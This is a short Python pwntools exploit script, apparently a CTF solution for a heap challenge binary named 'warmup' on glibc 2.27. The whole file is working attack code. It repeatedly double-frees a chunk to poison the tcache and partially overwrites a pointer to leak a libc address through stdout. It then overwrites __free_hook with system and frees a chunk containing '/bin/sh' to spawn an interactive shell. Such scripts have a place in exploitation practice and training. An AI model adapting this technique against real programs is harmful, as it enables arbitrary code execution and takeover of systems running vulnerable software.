from pwn import *
def cmd(c):
	p.sendafter(">>",str(c).ljust(0x10))
def add(c='A'):
	cmd(1)
	p.sendafter(">>",c)
def free(idx):
	cmd(2)
	p.sendlineafter(":",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter(":",str(idx))
	p.sendafter(">>",c)
context.log_level='debug'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
#p=process('./warmup',env={'LD_PRELOAD':'./libc-2.27.so'})
p=process('./warmup')
add("/bin/sh\x00")#0
add()#1
#padding
add()#2
add(p64(0x21)*8)#3
add(p64(0x21)*8)#4
free(2)
free(2)
free(2)
add("\x00")#2
add()#6
add(p64(0)+p64(0xa1))#7
for x in range(8):
	free(2)
add('\x60\xa7')#8
free(3)
free(3)
free(3)
free(3)
add('\x10')#3
add()#9
add()#10
add(p64(0x1800)+p64(0)*3+'\x00')
p.read(0x20)
base=u64(p.read(8))-(0x7f6c70bb9780-0x7f6c707ce000)

free(7)
free(8)

free(1)
free(1)


libc.address=base
#gdb.attach(p)
add(p64(libc.sym['__free_hook']))
add()
add(p64(libc.sym['system']))
log.warning(hex(base))

free(0)
p.interactive()
